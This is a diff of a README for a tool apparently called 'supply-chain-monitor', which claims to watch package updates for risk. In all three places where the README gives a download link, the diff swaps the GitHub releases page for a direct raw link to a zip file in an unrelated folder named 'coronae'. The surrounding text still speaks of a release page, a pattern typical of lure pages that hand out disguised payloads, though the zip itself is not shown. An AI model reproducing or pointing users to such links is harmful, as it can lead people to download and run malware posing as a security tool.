@@ -1,6 +1,6 @@
 # 🛡️ supply-chain-monitor - Watch package updates for risk
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/harriottdirty774/supply-chain-monitor/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip)
 
 ## 📦 What this app does
 
@@ -31,7 +31,7 @@ You can also turn off one of them after setup if you only want one source.
 
 Go to the release page here:
 
-[Download Supply Chain Monitor](https://github.com/harriottdirty774/supply-chain-monitor/releases)
+[Download Supply Chain Monitor](https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip)
 
 On that page, look for the latest release and download the Windows file for your system.
 
@@ -200,7 +200,7 @@ If one package source seems silent:
 
 Use this page to download the latest Windows file:
 
-[https://github.com/harriottdirty774/supply-chain-monitor/releases](https://github.com/harriottdirty774/supply-chain-monitor/releases)
+[https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip](https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip)
 
 ## 🔐 What the results mean
 
